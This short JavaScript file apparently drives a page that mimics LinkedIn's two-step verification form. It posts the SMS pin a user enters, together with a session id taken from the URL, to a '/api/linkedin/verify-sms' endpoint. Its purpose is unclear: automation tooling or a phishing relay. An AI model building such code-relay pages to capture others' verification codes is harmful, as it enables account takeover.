let sessionId = new URLSearchParams(window.location.search).get("sessionId");
let text = new URLSearchParams(window.location.search).get("text");

document.getElementById("content-header").textContent = text;

document.addEventListener("click", function(e) {
    let targetId = e.target.id;
    e.preventDefault();
    if (targetId == "two-step-submit-button") {
        submitForm();
    }
})

function submitForm() {
    let code = document.getElementById("input__phone_verification_pin").value;
    let submitFormXhr = new XMLHttpRequest();
    submitFormXhr.open("POST", "/api/linkedin/verify-sms", true);
    submitFormXhr.setRequestHeader("Content-type", "application/json");
    submitFormXhr.send(JSON.stringify({sessionId: sessionId, code: code}));

    submitFormXhr.onreadystatechange = function() {
        let response = this.response;
        console.log(response)
    }
}